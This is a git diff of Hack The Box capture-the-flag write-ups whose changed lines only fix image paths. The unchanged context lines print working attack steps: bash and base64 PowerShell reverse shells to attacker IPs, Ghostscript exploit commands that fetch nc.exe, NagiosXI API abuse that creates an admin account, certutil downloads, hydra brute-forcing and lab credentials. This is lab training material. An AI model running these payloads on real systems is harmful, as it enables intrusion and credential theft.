@@ -195,7 +195,7 @@ nmap -sVC 10.10.11.236 -Pn - 53 DOMAIN (Simple DNS Plus) - 80 HTTP (MS IIS httpd
 * Final Payload for shell.php file
   *   **`<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'") ?>`**
 
-      <figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 #### Craft ZIP+PDF from php script
 
@@ -209,7 +209,7 @@ nmap -sVC 10.10.11.236 -Pn - 53 DOMAIN (Simple DNS Plus) - 80 HTTP (MS IIS httpd
   * hex: **41 -> 00**
   *
 
-      <figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
 upload file & go to generated URL with removed .pdf extension (onlyhttp://......./shell.php)
 
@@ -254,9 +254,9 @@ reserse shell should be obtained in nc -nlvp \<PORT>
 
 #### Website
 
-<figure><img src=".gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption><p>https://10.10.11.241/</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption><p>https://10.10.11.241/</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption><p>http://10.10.11.241:8080</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption><p>http://10.10.11.241:8080</p></figcaption></figure>
 
 ### Weaponisation
 
@@ -268,7 +268,7 @@ reserse shell should be obtained in nc -nlvp \<PORT>
 
 #### Upload page
 
-<figure><img src=".gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption><p>10.10.11.241:8080/index.php</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption><p>10.10.11.241:8080/index.php</p></figcaption></figure>
 
 #### dirb
 
@@ -300,7 +300,7 @@ Uploads subpage is important for us. When we upload a file, we can access it via
     * redirect to: 10.10.11.241:8080/uploads/shell.phar
       * we have browser Reverse shell
 
-    <figure><img src=".gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption><p>10.10.11.241:8080/uploads/shell.phar</p></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption><p>10.10.11.241:8080/uploads/shell.phar</p></figcaption></figure>
 
 #### Reverse Shell crafting
 
@@ -335,7 +335,7 @@ Uploads subpage is important for us. When we upload a file, we can access it via
         * we obtained root privileges
 * cat /etc/shadow
 
-<figure><img src=".gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Decode the PW hash
 
@@ -352,7 +352,7 @@ ssh drwilliams@10.10.11.241
 
 `drwilliams:qwe123!@#`
 
-<figure><img src=".gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption><p>drwilliams Inbox</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption><p>drwilliams Inbox</p></figcaption></figure>
 
 * there are .eps attachments
 * drbrown says sth about GhostScript
@@ -369,47 +369,47 @@ ssh drwilliams@10.10.11.241
 * Prepare http.server for serving our exploit
   * `python3 -m http.server 8083`
 
-<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
 
 * Craft .eps Exploit
   * `python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.7:8083/nc64.exe -o nc.exe" --filename file.eps`
 
-<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
 
 * upload it via email attachment (.eps file) answering to drbrown email...
   * phishing
 
-<figure><img src=".gitbook/assets/image (18) (1) (1).png" alt=""><figcaption><p>upload it via answered email to drbrown</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption><p>upload it via answered email to drbrown</p></figcaption></figure>
 
 * we successfully served nc.exe to our http.server
 
-<figure><img src=".gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 2. OBTAIN REVERSE SHELL
 
 * Crafted second file.eps exploit with netcat port...
   * `python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.7 4444 -e cmd.exe" --filename file.eps`
 
-<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 * `nc -nlvp 4444`
 
-<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
 
 * upload exploit via answering email
 
-<figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
 
 * we have a reverse shell to user DRBROWN
 
-<figure><img src=".gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### drbrown credentials
 
 * `dir`
 * `type ghostscript.bat`
 
-<figure><img src=".gitbook/assets/image (24) (1).png" alt=""><figcaption><p>obtaining PW of user drbrown</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (24) (1).png" alt=""><figcaption><p>obtaining PW of user drbrown</p></figcaption></figure>
 
 #### connect via RDP
 
@@ -419,23 +419,23 @@ REMINNA&#x20;
 * IP: 10.10.11.241
 * PW: chr!$br0wn
 
-<figure><img src=".gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Root flag
 
-<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption><p>/xampp/htdocs is writeable</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption><p>/xampp/htdocs is writeable</p></figcaption></figure>
 
 we can see there is uploaded shell.php
 
 
 
-<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
 
 access website uploaded file...
 
-<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:red;">**PWNED <3**</mark>
 
@@ -451,7 +451,7 @@ access website uploaded file...
 * 80 HTTP
   * add to /etc/hosts
 
-<figure><img src=".gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
 
 #### website
 
@@ -511,7 +511,7 @@ dirb http://surveillance.htb/
       * 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
       * hashcat
 
-      <figure><img src=".gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
 
 #### SSH
 
@@ -591,7 +591,7 @@ dirb http://surveillance.htb/
 * 389 LDAP (OpenLDAP v2.2.X-2.3.X)
 * 443 SSL
 
-<figure><img src=".gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
 
 #### /etc/hosts
 
@@ -599,9 +599,9 @@ dirb http://surveillance.htb/
 
 #### website
 
-<figure><img src=".gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
 
 * Default credentials
   * root:nagiosxi
@@ -621,9 +621,9 @@ sudo apt install snmp
 
 **`snmpwalk -v2c -c public monitored.htb`**
 
-<figure><img src=".gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
 
 * svc:XjH7VCehowpR1xZB
   * not working, but could be useful in the future
@@ -634,7 +634,7 @@ sudo apt install snmp
 curl -POST -k 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500'
 ```
 
-<figure><img src=".gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>
 
 OK, we obtained auth\_token of user svc
 
@@ -660,22 +660,22 @@ NagiosXI v4.4.13
 curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin007&password=admin007&name=Admin007&email=admin007@localhost&auth_level=admin"
 ```
 
-<figure><img src=".gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>
 
 LOGIN via admin007
 
-<figure><img src=".gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
 
 Change PW of original admin
 
 * **`nagiosadmin:hacked`**
 * `SSH still not working...`
 
-<figure><img src=".gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -683,23 +683,23 @@ Gaining reverse shell access
 
 {% embed url="https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php" %}
 
-<figure><img src=".gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>
 
 * add new command
   * [https://www.revshells.com/](https://www.revshells.com/)
   * **`bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'`**
   *
 
-      <figure><img src=".gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>
 
 
   * Do not forget to click on Apply settings.&#x20;
   * Go to our host **`https://nagios.monitored.htb/nagiosxi/includes/components/ccm/?cmd=modify&type=host&id=1&page=1&returnUrl=index.php%3Fcmd%3Dview%26type%3Dhost%26page%3D1`**&#x20;
     * to the right, select our commands sequentially, then click Run command check.
 
-<figure><img src=".gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
 
 ### Root flag
 
@@ -707,15 +707,15 @@ Gaining reverse shell access
 
 sudo -l
 
-<figure><img src=".gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
 
 `cd /usr/local/nagiosxi/scripts/components`
 
 `cat getprofile.sh`
 
-<figure><img src=".gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
 
 #### obtaining id\_rsa file
 
@@ -725,7 +725,7 @@ Let's check the rights of the /usr/local/nagios/etc/nagios.cfg file:
 ls -la /usr/local/nagios/etc/nagios.cfg 
 ```
 
-<figure><img src=".gitbook/assets/image (114).png" alt=""><figcaption><p>we can edit this file</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption><p>we can edit this file</p></figcaption></figure>
 
 We correct the log\_file parameter as follows:
 
@@ -737,7 +737,7 @@ Now let's start the backup:
 sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
 ```
 
-<figure><img src=".gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>
 
 After execution, you should see the file **/usr/local/nagiosxi/var/components/profile.zip**, which you should unzip and find the file nagios-logs/**`nagios.txt,`** which will contain the **root user's private key.** Let's save it and log in.
 
@@ -794,7 +794,7 @@ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
 
 `cat root.txt`
 
-<figure><img src=".gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## POV
 
@@ -804,7 +804,7 @@ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
 
 `nmap -sVC 10.10.11.251`
 
-<figure><img src=".gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
 
 **/etc/hosts**
 
@@ -818,14 +818,14 @@ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
   * user: sfitz
   *
 
-      <figure><img src=".gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>
 
 **Fuzzing - nothing interesting**
 
 * ffuf -u http://pov.htb/FUZZ -w /home/zihuatanejo/Desktop/Tools/SecLists/Discovery/Web-Content/common.txt
 *
 
-    <figure><img src=".gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
 
 ### Weaponisation
 
@@ -834,13 +834,13 @@ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
 * dev.pov.htb
 *
 
-    <figure><img src=".gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
 
 
 * there is CV.pdf for download
 *
 
-    <figure><img src=".gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>
 
 
 * we can try to change the file with reverse shell payload...
@@ -851,7 +851,7 @@ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
 
 *
 
-    <figure><img src=".gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>
 
 
 *   Finding the exploit for VIEWSTATE which is response for downloading button...
@@ -861,7 +861,7 @@ CNvArnlhyB8ZevAAAADnJvb3RAbW9uaXRvcmVkAQIDBA==
     * try changing filename from cv.pdf to some sensitive info...
       * filename -> /web.config
 
-    <figure><img src=".gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>
 * we obtained keys below:
   * decryption="**AES**"
     * decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"&#x20;
@@ -883,7 +883,7 @@ print(cmdline)
 
 * python3 RSforPS.py \<ip> \<port>
 
-<figure><img src=".gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>
 
 ```
 powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
@@ -937,7 +937,7 @@ echo $Credential.GetNetworkCredential().password
   * `python3 -m http.server`
   *
 
-      <figure><img src=".gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
   * The link of the file will be like [http://YOUR\_IP:8000/filename](http://your_ip:8000/filename)
   * use the command below command to download the files in the victim machine
 
@@ -951,7 +951,7 @@ certutil.exe -urlcache -split -f "http://IP:8000/RunasCs.exe" ".\RunasCs.exe"
   * .\RunasCs.exe alaading **f8gQ8fynP44ek1m3** cmd.exe -r YOUR\_IP:4444
   *
 
-      <figure><img src=".gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>
 
 
   * `type C:\Users\alaading\Desktop\user.txt`
@@ -1004,7 +1004,7 @@ certutil.exe -urlcache -split -f "http://IP:8000/RunasCs.exe" ".\RunasCs.exe"
 
 * add jab.htb & DC01.jab.htb
 
-<figure><img src=".gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>
 
 ### Weaponisation
 
@@ -1019,7 +1019,7 @@ Kerbrute
 * we are gonna try to bruteforce some user creds for kerberos service
 * `./kerbrute userenum --dc dc01.jab.htb -d jab.htb /usr/share/seclists/usernames/xato-net-10-million-usernames.txt`
 
-<figure><img src=".gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>
 
 #### CVE
 
@@ -1052,12 +1052,12 @@ Pidgin app
   * D = `dc01.jab.htb`
   * PW = `Midnight_121`
 
-<figure><img src=".gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>
 
 * join a chat
   * room list -> pentest2003
 
-<figure><img src=".gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>
 
 * when reading the pentest discussion, there is a mention about svc\_openfire user ahd his cracked password
   * add another acount in Pidgin
@@ -1083,13 +1083,13 @@ Impacket & RS
       * Shell - Powershell
       * Encoding - None
 
-<figure><img src=".gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>
 
 * we obtained a reverse shell
   * `cd C:\Users\svc_openfire\Desktop`
   * `type user.txt`
 
-<figure><img src=".gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>
 
 ### Root flag
 
@@ -1113,7 +1113,7 @@ Impacket & RS
 
 #### website
 
-<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * try default credentials for OpenPLC
   * openplc:openplc
@@ -1162,7 +1162,7 @@ Impacket & RS
 * Compile & Start PLC
   * we obtained revshell, easily
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -1184,7 +1184,7 @@ Impacket & RS
 
 #### nmap
 
-<figure><img src=".gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
 
 #### website
 
@@ -1365,7 +1365,7 @@ Nmap done: 1 IP address (1 host up) scanned in 157.25 seconds
 
 * report.solarlab.htb:6791
 
-<figure><img src=".gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>
 
 ### Weaponisation
 
@@ -1373,20 +1373,20 @@ Nmap done: 1 IP address (1 host up) scanned in 157.25 seconds
 
 `smbclient -N -L 10.10.11.16`
 
-<figure><img src=".gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>
 
 `smbclient -N //10.10.11.16/Documents`
 
 * `get details-file.xlsx`
 
-<figure><img src=".gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>
 
 details-file.xlsx
 
 * PW file
   * tested these logins on report.solarlab.htb, but didnt work
 
-<figure><img src=".gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>
 
 #### hydra
 
@@ -1394,11 +1394,11 @@ lets test login with obtained credentials...
 
 * create usernames and passwords file
 
-<figure><img src=".gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>
 
 * `hydra -L usernames -P passwords -s 6791 report.solarlab.htb http-post-form "/login:username=^USER^&password=^PASS^:Login"`
 
-<figure><img src=".gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>
 
 * we obtained login for report subpage...
 
@@ -1408,11 +1408,11 @@ lets test login with obtained credentials...
 
 * BlakeB:ThisCanB3typedeasily1@
 
-<figure><img src=".gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>
 
 * under all of these for links, there is a form where we can **UPLOAD FILE**
 
-<figure><img src=".gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>
 
 * I tried to create revshell as php and saved it as png, but didnt work...
 
@@ -1422,11 +1422,11 @@ lets test login with obtained credentials...
 
 * Fill the form, generate PDF at analyse it in BurpSuite
 
-<figure><img src=".gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>
 
 * Report generated by reportlab.com
 
-<figure><img src=".gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>
 
 #### CVE
 
@@ -1440,11 +1440,11 @@ lets test login with obtained credentials...
 
 * revshells.com
 
-<figure><img src=".gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>
 
 * we will place the payload into the field of the form (0123456789)
 
-<figure><img src=".gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>
 
 * body of payload
 
@@ -1467,11 +1467,11 @@ lets test login with obtained credentials...
 </para>
 ```
 
-<figure><img src=".gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>
 
 * we are in
 
-<figure><img src=".gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>
 
 ### Root flag
 
